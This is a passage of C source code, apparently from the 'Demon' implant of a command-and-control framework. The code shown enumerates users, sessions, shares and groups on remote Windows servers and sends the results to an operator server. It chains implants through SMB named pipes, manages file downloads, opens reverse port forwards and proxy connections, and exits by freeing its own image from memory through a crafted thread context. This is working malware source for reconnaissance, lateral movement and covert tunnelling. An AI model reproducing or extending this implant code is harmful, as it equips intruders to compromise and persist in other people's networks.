                    Instance.Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( UserInfo != NULL )
                Instance.Win32.NetApiBufferFree( UserInfo );

            break;

        CLEANUP:
            if ( UserInfo != NULL )
                Instance.Win32.NetApiBufferFree( UserInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_SESSIONS:
        {
            PUTS( "DEMON_NET_COMMAND_SESSIONS" )

            LPSESSION_INFO_10 SessionInfo       = NULL;
            DWORD             EntriesRead       = 0;
            DWORD             TotalEntries      = 0;
            DWORD             ResumeHandle      = 0;
            LPWSTR            ServerName        = NULL;
            DWORD             NetStatus         = 0;
            CHAR              ClientName[ 260 ] = { 0 };
            DWORD             ClientNameSize    = 0;
            CHAR              UserName[ 260 ]   = { 0 };
            DWORD             UserNameSize      = 0;

            ServerName = ParserGetBytes( Parser, &UserNameSize );

            PackageAddBytes( Package, ServerName, UserNameSize );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance.Win32.NetSessionEnum( ServerName, NULL, NULL, 10, &SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );

                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; i < EntriesRead ; i++ )
                    {
                        if ( SessionInfo == NULL )
                            break;

                        ClientNameSize = WCharStringToCharString( ClientName, SessionInfo[i].sesi10_cname, StringLengthW( SessionInfo[i].sesi10_cname ) );
                        UserNameSize   = WCharStringToCharString( UserName, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) );

                        PackageAddBytes( Package, ClientName, ClientNameSize );
                        PackageAddBytes( Package, UserName, UserNameSize );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                    }
                }
                else
                {
                    PRINTF( "NetSessionEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto SESSION_CLEANUP;
                }

                if ( SessionInfo != NULL )
                {
                    Instance.Win32.NetApiBufferFree( SessionInfo );
                    SessionInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( SessionInfo )
                Instance.Win32.NetApiBufferFree( SessionInfo );

            break;

        SESSION_CLEANUP:
            if ( SessionInfo != NULL )
                Instance.Win32.NetApiBufferFree( SessionInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_COMPUTER:
        {
            PUTS( "DEMON_NET_COMMAND_COMPUTER" )

            break;
        }

        case DEMON_NET_COMMAND_DCLIST:
        {
            PUTS( "DEMON_NET_COMMAND_DCLIST" )
            break;
        }

        case DEMON_NET_COMMAND_SHARE:
        {
            PUTS( "DEMON_NET_COMMAND_SHARE" )

            PSHARE_INFO_502 ShareInfo    = NULL;
            DWORD           NetStatus    = 0;
            DWORD           Entries      = 0;
            DWORD           TotalEntries = 0;
            DWORD           Resume       = 0;
            LPWSTR          ServerName   = NULL;
            DWORD           ServerSize   = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );
            do
            {
                NetStatus = Instance.Win32.NetShareEnum ( ServerName, 502, &ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
                if( ( NetStatus == ERROR_SUCCESS ) || ( NetStatus == ERROR_MORE_DATA ) )
                {

                    for( DWORD i = 0; i < Entries; i++ )
                    {
                        PRINTF( "%-5ls %-20ls %d %-20ls\n", ShareInfo[i].shi502_netname, ShareInfo[i].shi502_path, ShareInfo[i].shi502_permissions, ShareInfo[i].shi502_remark );

                        PackageAddBytes( Package, ShareInfo[i].shi502_netname, StringLengthW( ShareInfo[i].shi502_netname ) * 2 );
                        PackageAddBytes( Package, ShareInfo[i].shi502_path, StringLengthW( ShareInfo[i].shi502_path ) * 2 );
                        PackageAddBytes( Package, ShareInfo[i].shi502_remark, StringLengthW( ShareInfo[i].shi502_remark ) * 2 );
                        PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
                    }

                    Instance.Win32.NetApiBufferFree( ShareInfo );
                    ShareInfo = NULL;
                }
                else
                    PRINTF( "Error: %ld\n", NetStatus );
            }
            while ( NetStatus == ERROR_MORE_DATA );

            break;
        }

        case DEMON_NET_COMMAND_LOCALGROUP:
        {
            PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;

            WCHAR               Group[ 260 ]  = { 0 };
            DWORD               GroupSize     = 0;

            WCHAR               Desc[260 * 2] = { 0 };
            WCHAR               DescSize      = { 0 };

            LPWSTR              ServerName    = NULL;
            DWORD               ServerSize    = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );

            PRINTF( "ServerName => %ls\n", ServerName );

            NetStatus = Instance.Win32.NetLocalGroupEnum( ServerName, 1, &GroupInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )
                {
                    for( DWORD i = 0; i < EntriesRead; i++ )
                    {
                        MemSet( Group, 0, 260 );
                        MemSet( Desc,  0, 260 * 2 );

                        GroupSize = WCharStringToCharString( Group, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) );
                        DescSize  = WCharStringToCharString( Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) );

                        PackageAddBytes( Package, Group, GroupSize );
                        PackageAddBytes( Package, Desc, DescSize );
                    }

                    Instance.Win32.NetApiBufferFree( GroupInfo );
                    GroupInfo = NULL;
                }
            }

            break;
        }

        case DEMON_NET_COMMAND_GROUP:
        {
            PUTS( "DEMON_NET_COMMAND_GROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            DWORD               Resume        = 0;
            WCHAR               Group[ 260 ]  = { 0 };
            DWORD               GroupSize     = 0;
            WCHAR               Desc[260 * 2] = { 0 };
            WCHAR               DescSize      = { 0 };
            LPWSTR              ServerName    = NULL;
            DWORD               ServerSize    = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );

            NetStatus = Instance.Win32.NetGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, NULL );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                if ( GroupInfo )
                {
                    for( DWORD i = 0;i < EntriesRead; i++ )
                    {
                        MemSet( Group, 0, 260 );
                        MemSet( Desc, 0, 260 * 2 );

                        GroupSize = WCharStringToCharString( Group, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) );
                        DescSize  = WCharStringToCharString( Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) );

                        PackageAddBytes( Package, Group, GroupSize );
                        PackageAddBytes( Package, Desc, DescSize );
                    }
                }

                Instance.Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            if ( GroupInfo )
            {
                Instance.Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }

            break;
        }

        case DEMON_NET_COMMAND_USER:
        {
            PUTS( "DEMON_NET_COMMAND_USER" )

            LPUSER_INFO_0  UserInfo     = NULL;
            DWORD          NetStatus    = 0;
            DWORD          EntriesRead  = 0;
            DWORD          TotalEntries = 0;
            DWORD          Resume       = 0;
            LPWSTR         ServerName   = NULL;
            DWORD          ServerSize   = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );

            NetStatus = Instance.Win32.NetUserEnum( ServerName, 0, 0, &UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                for ( DWORD i = 0; i < EntriesRead; i++ )
                {
                    if ( UserInfo[ i ].usri0_name )
                    {
                        PackageAddBytes( Package, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) * 2 );
                        PackageAddInt32( Package, FALSE ); // TODO: fix this.
                    }
                }

                if ( UserInfo )
                {
                    Instance.Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            break;
        }

        default:
        {
            PUTS( "COMMAND NOT FOUND" )
            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandPivot( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_PIVOT );
    DWORD    Pivot   = ParserGetInt32( Parser );

    PackageAddInt32( Package, Pivot );

    PRINTF( "Pivot => %d\n", Pivot );

    switch ( Pivot )
    {
        case DEMON_PIVOT_LIST:
        {
            PUTS( "DEMON_PIVOT_LIST" )
            PPIVOT_DATA TempList = Instance.SmbPivots;

            do
            {
                if ( TempList )
                {
                    PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%ls]\n", TempList->DemonID, TempList->PipeName.Buffer )

                    PackageAddInt32( Package, TempList->DemonID );
                    PackageAddBytes( Package, TempList->PipeName.Buffer, TempList->PipeName.Length );

                    TempList = TempList->Next;
                } else break;
            }
            while ( TRUE );

            break;
        }

        case DEMON_PIVOT_SMB_CONNECT:
        {
            PUTS( "DEMON_PIVOT_SMB_CONNECT" )

            DWORD  BytesSize = 0;
            PVOID  Output    = NULL;
            BUFFER PipeName  = { 0 };

            PipeName.Buffer = ParserGetBytes( Parser, &PipeName.Length );

            if ( PivotAdd( PipeName, &Output, &BytesSize ) )
            {
                PRINTF( "Successful connected: %x : %d\n", Output, BytesSize )

                PackageAddInt32( Package, TRUE );
                PackageAddBytes( Package, Output, BytesSize );

                MemSet( Output, 0, BytesSize );
                Instance.Win32.LocalFree( Output );
                Output = NULL;

#ifdef DEBUG
                PPIVOT_DATA TempList = Instance.SmbPivots;

                printf( "Smb Pivots : [ " );
                do {
                    if ( TempList )
                    {
                        printf( "%x ", TempList->DemonID );
                        TempList = TempList->Next;
                    } else
                        break;
                } while ( TRUE );
                puts( "]" );
#endif
            }
            else
            {
                PUTS( "Failed to connect" )
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, NtGetLastError() );
            }

            break;
        }

        case DEMON_PIVOT_SMB_DISCONNECT:
        {
            DWORD AgentID = ParserGetInt32( Parser );
            DWORD Success = FALSE;

            Success = PivotRemove( AgentID );

            PackageAddInt32( Package, Success );
            PackageAddInt32( Package, AgentID );

            break;
        }

        case DEMON_PIVOT_SMB_COMMAND:
        {
            PUTS( "DEMON_PIVOT_SMB_COMMAND" )

            UINT32      DemonId   = ParserGetInt32( Parser );
            DWORD       Size      = 0;
            PVOID       Data      = ParserGetBytes( Parser, &Size );
            PPIVOT_DATA TempList  = Instance.SmbPivots;
            PPIVOT_DATA PivotData = NULL;

            PRINTF( "Search DemonId => %x\n", DemonId );
            do
            {
                if ( TempList ) {
                    // if the specified demon was found break the loop
                    if ( TempList->DemonID == DemonId ) {
                        PivotData = TempList;
                        PRINTF( "Found Demon: %x\n", TempList->DemonID );
                        break;
                    }
                    // select the next pivot
                    TempList = TempList->Next;
                } else break;
            } while ( TRUE );

            if ( PivotData )
            {
                if ( ! Instance.Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
                {
                    PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
                    CALLBACK_GETLASTERROR
                } else PUTS( "Successful wrote demon data" )
            } else PUTS( "Didn't found demon pivot" )
        }

        default: break;
    }

    PUTS( "Pivot transport" )
    PackageTransmit( Package, NULL, NULL );
}

VOID CommandTransfer( PPARSER Parser )
{
    DWORD          Command  = 0;
    PPACKAGE       Package  = NULL;
    PDOWNLOAD_DATA Download = NULL;
    DWORD          FileID   = 0;
    BOOL           Found    = 0;

    Package  = PackageCreate( DEMON_COMMAND_TRANSFER );
    Command  = ParserGetInt32( Parser );
    Download = Instance.Downloads;

    PackageAddInt32( Package, Command );

    switch ( Command )
    {
        case 0x0: PUTS( "Transfer::list" )
        {
            for ( ;; )
            {
                if ( ! Download )
                    break;

                /* Add download data */
                PackageAddInt32( Package, Download->FileID   );
                PackageAddInt32( Package, Download->ReadSize );
                PackageAddInt32( Package, Download->State    );

                Download = Download->Next;
            }
            break;
        }

        case 0x1: PUTS( "Transfer::stop" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_STOPPED;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case 0x2: PUTS( "Transfer::resume" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_RUNNING;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            break;
        }

        case 0x3: PUTS( "Transfer::remove" )
        {
            FileID = ParserGetInt32( Parser );

            for ( ;; )
            {
                if ( ! Download )
                    break;

                if ( Download->FileID == FileID )
                {
                    Download->State = DOWNLOAD_STATE_REMOVE;
                    Found           = TRUE;

                    PRINTF( "Found download (%x) and stopped it.\n", Download->FileID )
                    break;
                }

                Download = Download->Next;
            }

            /* Tell us if we managed to find and resume the download */
            PackageAddInt32( Package, Found  );
            PackageAddInt32( Package, FileID );

            /* Tell the server to close the file. Only if we found the download */
            if ( Found )
            {
                PPACKAGE Package2 = PackageCreate( DEMON_COMMAND_TRANSFER );
                PackageAddInt32( Package2, Command );
                PackageAddInt32( Package2, FileID );
                PackageAddInt32( Package2, DOWNLOAD_REASON_REMOVED );
                PackageTransmit( Package2, NULL, NULL );
                Package2 = NULL;
            }

            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandSocket( PPARSER Parser )
{
    PPACKAGE     Package = NULL;
    PSOCKET_DATA Socket  = NULL;
    DWORD        Command = 0;

    Package = PackageCreate( DEMON_COMMAND_SOCKET );
    Command = ParserGetInt32( Parser );

    PackageAddInt32( Package, Command );
    switch ( Command )
    {
        case SOCKET_COMMAND_RPORTFWD_ADD: PUTS( "Socket::RPortFwdAdd" )
        {
            DWORD LclAddr = 0;
            DWORD LclPort = 0;
            DWORD FwdAddr = 0;
            DWORD FwdPort = 0;

            /* Parse Host and Port to bind to */
            LclAddr = ParserGetInt32( Parser );
            LclPort = ParserGetInt32( Parser );

            /* Parse Host and Port to forward port to */
            FwdAddr = ParserGetInt32( Parser );
            FwdPort = ParserGetInt32( Parser );

            /* Create a reverse port forward socket and insert it into the linked list. */
            Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PORTFWD, LclAddr, LclPort, FwdAddr, FwdPort );

            /* if Socket is not NULL then we managed to start a socket. */
            PackageAddInt32( Package, Socket ? TRUE : FALSE );
            PackageAddInt32( Package, Socket ? Socket->ID : 0 );

            /* Add our Bind Host & Port data */
            PackageAddInt32( Package, LclAddr );
            PackageAddInt32( Package, LclPort );

            /* Add our Forward Host & Port data */
            PackageAddInt32( Package, FwdAddr );
            PackageAddInt32( Package, FwdPort );

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_LIST: PUTS( "Socket::RPortFwdList" )
        {
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                {
                    PackageAddInt32( Package, Socket->ID );

                    /* Add our Bind Host & Port data */
                    PackageAddInt32( Package, Socket->LclAddr );
                    PackageAddInt32( Package, Socket->LclPort );

                    /* Add our Forward Host & Port data */
                    PackageAddInt32( Package, Socket->FwdAddr );
                    PackageAddInt32( Package, Socket->FwdPort );
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_REMOVE: PUTS( "Socket::RPortFwdRemove" )
        {
            DWORD SocketID = 0;

            SocketID = ParserGetInt32( Parser );
            Socket   = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD && Socket->ID == SocketID )
                {
                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;

                    /* we don't want to send the message now.
                     * send it while we are free and closing the socket. */
                    PackageDestroy( Package );
                    Package = NULL;

                    break;
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_RPORTFWD_CLEAR: PUTS( "Socket::RPortFwdClear" )
        {
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->Type == SOCKET_TYPE_REVERSE_PORTFWD )
                    Socket->Type = SOCKET_TYPE_CLIENT_REMOVED;

                Socket = Socket->Next;
            }

            /* we don't want to send the message now.
             * send it while we are free and closing the sockets. */
            PackageDestroy( Package );
            Package = NULL;

            break;
        }

        case SOCKET_COMMAND_SOCKSPROXY_ADD: PUTS( "Socket::SocksProxyAdd" )
        {
            /* TODO: implement */

            break;
        }

        case SOCKET_COMMAND_READ_WRITE: PUTS( "Socket::Write" )
        {
            DWORD  SocketID = 0;
            BUFFER Data     = { 0 };
            DWORD  Result   = 0;

            /* Parse arguments */
            SocketID    = ParserGetInt32( Parser );
            Data.Buffer = ParserGetBytes( Parser, &Data.Length );

            PRINTF( "Data[%d]: %p\n", Data.Length, Data.Buffer )

            /* get Sockets list */
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ID == SocketID )
                {
                    PRINTF( "Found socket: %x\n", Socket->ID )

                    /* write the data to the socket */
                    if ( Instance.Win32.send( Socket->Socket, Data.Buffer, Data.Length, 0 ) == SOCKET_ERROR )
                        PUTS( "send failed" );

                    /* destroy the package and exit this command function */
                    PackageDestroy( Package );

                    return;
                }

                Socket = Socket->Next;
            }

            break;
        }

        case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
        {
            DWORD ScId = 0;
            LPSTR Host = NULL;
            DWORD Addr = 0;
            DWORD Port = 0;

            /* parse arguments */
            ScId = ParserGetInt32( Parser );
            Port = ParserGetInt32( Parser );
            Addr = ParserGetInt32( Parser );
            Host = ParserGetBytes( Parser, NULL );

            /* check if its 0.0.0.1
             * if it's an addr then query for the host.
             * if not the use the addr to connect */
            if ( ( ( Addr >> ( 8 * 3 ) ) & 0xff ) == 0x00 &&
                 ( ( Addr >> ( 8 * 2 ) ) & 0xff ) == 0x00 &&
                 ( ( Addr >> ( 8 * 1 ) ) & 0xff ) == 0x00 &&
                 ( ( Addr >> ( 8 * 0 ) ) & 0xff ) == 0x1 )
            {
                /* query ip from specified host/domain */
                Addr = DnsQueryIP( Host );
            }

            /* check if address is not 0 */
            if ( Addr )
            {
                /* Create a socks proxy socket and insert it into the linked list. */
                if ( ( Socket = SocketNew( NULL, SOCKET_TYPE_REVERSE_PROXY, HTONS32( Addr ), Port, 0, 0 ) ) )
                    Socket->ID = ScId;

                PackageAddInt32( Package, Socket ? TRUE : FALSE );
            }
            else PackageAddInt32( Package, FALSE );

            PackageAddInt32( Package, ScId );

            break;
        }

        case SOCKET_COMMAND_CLOSE: PUTS( "Socket::Close" )
        {
            DWORD SocketID = 0;

            /* parse arguments */
            SocketID = ParserGetInt32( Parser );

            /* get Sockets list */
            Socket = Instance.Sockets;

            for ( ;; )
            {
                if ( ! Socket )
                    break;

                if ( Socket->ID == SocketID )
                {
                    PRINTF( "Found socket: %x\n", Socket->ID )

                    Socket->Type = ( Socket->Type == SOCKET_TYPE_CLIENT ) ?
                                   SOCKET_TYPE_CLIENT_REMOVED :
                                   SOCKET_TYPE_SOCKS_REMOVED  ;

                    /* destroy the package and exit this command function */
                    PackageDestroy( Package );

                    return;
                }

                Socket = Socket->Next;
            }

            break;
        }

        default: break;
    }

    PackageTransmit( Package, NULL, NULL );
}

// TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
VOID CommandExit( PPARSER Parser )
{
    PUTS( "Exit" )

    /* default is 1 == exit thread.
     * TODO: make an config that holds the default exit method */
    UINT32   ExitMethod = 1;
    PPACKAGE Package    = NULL;
    CONTEXT  RopExit    = { 0 };
    LPVOID   ImageBase  = NULL;
    SIZE_T   ImageSize  = 0;

    if ( Parser )
    {
        /* Send our last message to our server...
         * "My battery is low, and it’s getting dark." */
        Package    = PackageCreate( DEMON_EXIT );
        ExitMethod = ParserGetInt32( Parser );

        PackageAddInt32( Package, ExitMethod );
        PackageTransmit( Package, NULL, NULL );
    }

    // TODO: release every resource we allocated...

    /* NOTE:
     *      Credit goes to Austin (@ilove2pwn_) for sharing this code with me.
     * TODO:
     *      Clear memory by using a gadgets that prepares and executes movsb
     */

    ImageBase = C_PTR( Instance.Session.ModuleBase );
    ImageSize = IMAGE_SIZE( ImageBase );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance.Win32.RtlCaptureContext( &RopExit );

    RopExit.Rip = U_PTR( Instance.Syscall.NtFreeVirtualMemory );
    RopExit.Rsp = U_PTR( ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000 );
    RopExit.Rcx = U_PTR( NtCurrentProcess() );
    RopExit.Rdx = U_PTR( &ImageBase );
    RopExit.R8  = U_PTR( &ImageSize );
    RopExit.R9  = U_PTR( MEM_RELEASE );

    if ( ExitMethod == 1 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserThread );

    else if ( ExitMethod == 2 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance.Win32.RtlExitUserProcess );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance.Syscall.NtContinue( &RopExit, FALSE );
}
